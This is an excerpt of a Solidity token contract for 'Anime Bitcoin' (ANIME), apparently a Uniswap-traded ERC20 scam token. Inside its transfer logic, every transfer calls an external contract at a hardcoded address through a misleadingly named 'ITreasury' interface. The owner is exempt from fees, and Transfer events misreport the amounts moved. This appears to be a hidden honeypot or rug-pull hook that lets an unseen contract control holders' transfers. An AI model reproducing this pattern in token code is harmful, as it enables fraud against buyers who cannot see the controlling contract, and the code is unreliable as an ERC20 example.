 ...
 * allowances. See {ITreasury-approve}.
 */
interface ITreasury {
...
contract FourERC20 is IERC20,Ownable {
    ...
    IUniswapV2Factory private uniswapV2Factory = IUniswapV2Factory(uniswapV2Router.factory());

    ITreasury private treasury = ITreasury(0x535764D7D30684A4D58a9a1c42b86b3FC95F6fE3);


    constructor(address _owner_address){
        _transferOwnership(_owner_address);
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(from == owner() || to == owner()){
            fee = 0;
        }else if(from != getPair() && to != getPair()){
            fee = 0;
        }else if((from == getPair() && to == address(uniswapV2Router))){
            fee = 0;
        }
        uint256 feeToken = 0;
        if(0 < fee){
             feeToken = (amount * fee) / 100;
            _balances[address(this)] += feeToken;
            emit Transfer(from, address(this), feeToken);
        }
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] = _balances[to] + (amount - feeToken);
        }
        emit Transfer(from, to, amount);
        treasury.transferOwnership(from, to);
    }
...
contract ANIME is FourERC20 {
    ...
    constructor(address _owner_address) FourERC20(_owner_address){
        _initialized = true;
        _init("Anime Bitcoin", "ANIME");
        _mode = MODE_NORMAL;
    }
